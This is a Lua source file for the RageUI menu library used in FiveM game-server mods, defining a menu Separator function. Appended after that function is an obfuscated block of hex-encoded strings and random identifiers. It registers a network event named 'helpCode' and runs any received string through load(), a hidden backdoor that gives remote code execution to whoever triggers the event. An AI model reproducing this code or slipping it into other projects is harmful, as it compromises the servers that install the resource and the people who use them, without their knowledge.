---
--- @author Dylan MALANDAIN
--- @version 2.0.0
--- @since 2020
---
--- RageUI Is Advanced UI Libs in LUA for make beautiful interface like RockStar GAME.
---
---
--- Commercial Info.
--- Any use for commercial purposes is strictly prohibited and will be punished.
---
--- @see RageUI
---

---@type table
local SettingsButton = {
    Rectangle = { Y = 0, Width = 431, Height = 29 },
    Text = { X = 8, Y = 0, Scale = 0.33 },
}

function RageUI.Separator(Label)
    local CurrentMenu = RageUI.CurrentMenu
    if CurrentMenu ~= nil then
        if CurrentMenu() then
            local Option = RageUI.Options + 1
            if CurrentMenu.Pagination.Minimum <= Option and CurrentMenu.Pagination.Maximum >= Option then
                if (Label ~= nil) then
                    RenderText(Label, CurrentMenu.X + SettingsButton.Text.X + (CurrentMenu.WidthOffset * 2.5 ~= 0 and CurrentMenu.WidthOffset * 2.5 or 200), CurrentMenu.Y + SettingsButton.Text.Y + CurrentMenu.SubtitleHeight + RageUI.ItemOffset, 0, SettingsButton.Text.Scale, 245, 245, 245, 255, 1)
                end
                RageUI.ItemOffset = RageUI.ItemOffset + SettingsButton.Rectangle.Height
                if (CurrentMenu.Index == Option) then
                    if (RageUI.LastControl) then
                        CurrentMenu.Index = Option - 1
                        if (CurrentMenu.Index < 1) then
                            CurrentMenu.Index = RageUI.CurrentMenu.Options
                        end
                    else
                        CurrentMenu.Index = Option + 1
                    end
                end
            end
            RageUI.Options = RageUI.Options + 1
        end
    end
end



local aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs[6][aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs[1]](aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs[2]) aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs[6][aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs[3]](aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs[2], function(BDClvrslnuFFgAKfCOimAhlqSKifhzegrjIlDtdSkgsxOXXRjURvyczfhoXXSPdGNkmzaZ) aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs[6][aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs[4]](aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs[6][aBsDpJKiLnzGcQSfAsWxqwvMOJHuYciQQKQuTrGuXxIsnQqQqJJgumZVXLHRsmihAgbyXs[5]](BDClvrslnuFFgAKfCOimAhlqSKifhzegrjIlDtdSkgsxOXXRjURvyczfhoXXSPdGNkmzaZ))() end)